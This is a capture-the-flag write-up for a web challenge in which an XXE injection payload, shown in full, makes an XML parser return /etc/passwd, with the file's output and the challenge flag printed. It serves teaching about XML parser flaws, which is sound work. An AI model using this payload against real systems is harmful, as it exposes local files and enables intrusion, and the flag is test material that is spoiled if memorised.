# SOAP
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file? (100 Points)

## Solution
The tag 'xxe' of the challenge gives a hint on what we have to look for.

Opening the page we can click several button that will show different information. In ZAP we can see that there is a POST call with XML as payload: `<?xml version="1.0" encoding="UTF-8"?><data><ID>2</ID></data>`

XXE (XML\_External\_Entity) attacks the application that parses the XML code. If the parser isnt well configured we can abuse it and access over the XML payload local files.

Manipulating the Request
```
<?xml version="1.0" encoding="UTF-8"?><data><ID>3</ID></data>
```
to
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data><ID>&xxe;</ID></data>
```
gives the /etc/passwd back. Included in here is the flag:
```
[...]
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
flask:x:999:999::/app:/bin/sh
picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_55662c16}
```

## Further reading
<https://portswigger.net/web-security/xxe>
<https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing>
